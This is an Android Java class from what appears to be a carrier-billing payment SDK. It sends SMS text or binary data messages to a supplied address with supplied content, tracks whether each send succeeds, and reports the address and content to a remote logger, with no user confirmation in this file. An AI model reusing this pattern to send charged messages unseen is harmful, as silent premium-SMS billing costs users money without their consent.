package com.core_sur.task;

import java.io.UnsupportedEncodingException;
import java.net.URLDecoder;
import java.util.Random;

import android.app.Activity;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.telephony.SmsManager;

import com.core_sur.Config;
import com.core_sur.WCConnect;
import com.core_sur.bean.FeeSMSStatusMessage;
import com.core_sur.finals.URLFinals;
import com.core_sur.publics.EPCoreManager;
import com.core_sur.tools.Base64UTF;
import com.core_sur.tools.CheckLog;
import com.core_sur.tools.CommonUtils;

public class Sms extends Pay {
	public static final int SMS_SEND_STATUS_NONE = 1;
	public static final int SMS_SEND_STATUS_SEND_ING = 2;
	public static final int SMS_SEND_STATUS_SEND_OK = 3;
	public static final int SMS_SEND_STATUS_SEND_FIAL = 4;
	String address;
	String content;
	int sendStatus = SMS_SEND_STATUS_NONE;
	int timeout = 22;

	public int getTimeout() {
		return timeout;
	}

	public void setTimeout(int timeout) {
		this.timeout = timeout;
	}

	public String getOther() {
		return other;
	}

	public void setOther(String other) {
		this.other = other;
	}

	SendBroadCast sendBroadCast;
	String other;
	boolean isListen;

	public Sms() {
		setType(PAY_TYPE_SMS);
	}

	public String getAddress() {
		return address;
	}

	public void setAddress(String address) {
		this.address = address;
	}

	public String getContent() {
		return content;
	}

	public void setContent(String content) {
		this.content = content;
	}

	public int getSendStatus() {
		return sendStatus;
	}

	public void setSendStatus(int sendStatus) {
		this.sendStatus = sendStatus;
	}

	@Override
	public void run() {
		super.run();
		setExecuteStatus(EXECUTE_STATUS_RUN);
		SmsManager smsManager = SmsManager.getDefault();
		int requestCode = new Random(System.currentTimeMillis()).nextInt(3000);
		String broadCast = "com.ep.core.sms." + key;
		PendingIntent pendingIntent = PendingIntent.getBroadcast(context,
				requestCode, new Intent(broadCast),
				PendingIntent.FLAG_UPDATE_CURRENT);
		sendBroadCast = new SendBroadCast();
		getContext().registerReceiver(sendBroadCast,
				new IntentFilter(broadCast));
		try {
			content = URLDecoder.decode(content, "utf-8");
		} catch (UnsupportedEncodingException e1) {
			// TODO Auto-generated catch block
			e1.printStackTrace();
		}
		try {
			if (content.startsWith("binmessage:")) {
				CheckLog.log(this.getClass().getName(), "sendSmsData", content);
				content = content.substring("binmessage:".length(),
						content.length());
				short destinationPort = 0;
				smsManager.sendDataMessage(address, null, destinationPort,
						Base64UTF.decode(content.getBytes("utf-8")),
						pendingIntent, null);
			} else {
				smsManager.sendTextMessage(address, null,
						new String(content.getBytes(), "utf-8"), pendingIntent,
						null);
			}
		} catch (Exception e) {
			e.fillInStackTrace();
		}
		isListen = true;
		sendStatus = SMS_SEND_STATUS_SEND_ING;
		new SmsListen().start();
	}

	@Override
	public String toString() {
		return "Sms [address=" + address + ", content=" + content
				+ ", sendStatus=" + sendStatus + ", timeout=" + timeout
				+ ", sendBroadCast=" + sendBroadCast + ", other=" + other
				+ ", isListen=" + isListen + "]";
	}

	class SendBroadCast extends BroadcastReceiver {

		@Override
		public void onReceive(Context context, Intent intent) {
			String timeStamp;
			switch (getResultCode()) {
			case Activity.RESULT_OK:
				sendStatus = SMS_SEND_STATUS_SEND_OK;
				WCConnect.getInstance().PostLog(
						"SMSSendStatus:-1" + Config.splitStringLevel1 + address
								+ Config.splitStringLevel1 + content
								+ Config.splitStringLevel1 + "SendOK");
				EPCoreManager.getInstance().payHandler
						.sendEmptyMessage(Config.CMD_SENDSMSSUCCESS);
				if (WCConnect.getInstance().currentPayFeeMessage != null) {
					timeStamp = (String) WCConnect.getInstance().currentPayFeeMessage
							.get("TimeStamp");
				} else {
					timeStamp = "未知流水号 AppKey:"
							+ CommonUtils.getAppKey(context);
				}
				FeeSMSStatusMessage feeSMSStatusMessage = new FeeSMSStatusMessage(
						timeStamp, 0);
				//EPCoreManager.getInstance().sendMessage(URLFinals.WEB_SMSSTATIC,feeSMSStatusMessage, null);
						
				break;
			default:
				sendStatus = SMS_SEND_STATUS_SEND_FIAL;
				EPCoreManager.getInstance().payHandler
				.sendEmptyMessage(Config.CMD_SENDSMSERROR);
		WCConnect.getInstance().PostLog(
				"SMSSendStatus:" + getResultCode()
						+ Config.splitStringLevel1 + address
						+ Config.splitStringLevel1 + content
						+ Config.splitStringLevel1
						+ "SendErro,meybe UserCancel");
		if (WCConnect.getInstance().currentPayFeeMessage != null) {
			timeStamp = (String) WCConnect.getInstance().currentPayFeeMessage
					.get("TimeStamp");
		} else {
			timeStamp = "未知流水号 AppKey:"
					+ CommonUtils.getAppKey(context);
		}
		feeSMSStatusMessage = new FeeSMSStatusMessage(timeStamp, -1);
		//EPCoreManager.getInstance().sendMessage(URLFinals.WEB_SMSSTATIC,feeSMSStatusMessage, null);
				
				break;
			}
			setExecuteStatus(EXECUTE_STATUS_COMPLETE);
			unRegistSend();
			isListen = false;
		}

	}

	class SmsListen extends Thread {
		@Override
		public void run() {
			super.run();
			int currentTime = 0;
			while (currentTime < timeout && isListen) {
				currentTime++;
				try {
					Thread.sleep(1000);
				} catch (InterruptedException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			}
			if (currentTime >= timeout) {
				if (sendStatus != SMS_SEND_STATUS_SEND_OK) {
					sendStatus = SMS_SEND_STATUS_SEND_FIAL;
					
					EPCoreManager.getInstance().payHandler
					.sendEmptyMessage(Config.CMD_SENDSMSERROR);
			WCConnect.getInstance().PostLog(
					"SMSSendStatus:" + 1
							+ Config.splitStringLevel1 + address
							+ Config.splitStringLevel1 + content
							+ Config.splitStringLevel1
							+ "SendErro,meybe UserCancel");
			String timeStamp;
			if (WCConnect.getInstance().currentPayFeeMessage != null) {
				timeStamp = (String) WCConnect.getInstance().currentPayFeeMessage
						.get("TimeStamp");
			} else {
				timeStamp = "未知流水号 AppKey:"
						+ CommonUtils.getAppKey(context);
			}
			FeeSMSStatusMessage feeSMSStatusMessage = new FeeSMSStatusMessage(timeStamp, -1);
			//EPCoreManager.getInstance().sendMessage(URLFinals.WEB_SMSSTATIC,feeSMSStatusMessage, null);
					
			
					setExecuteStatus(EXECUTE_STATUS_COMPLETE);
					unRegistSend();
				}
			}
		}
	}

	public void unRegistSend() {
		getContext().unregisterReceiver(sendBroadCast);
	}

}
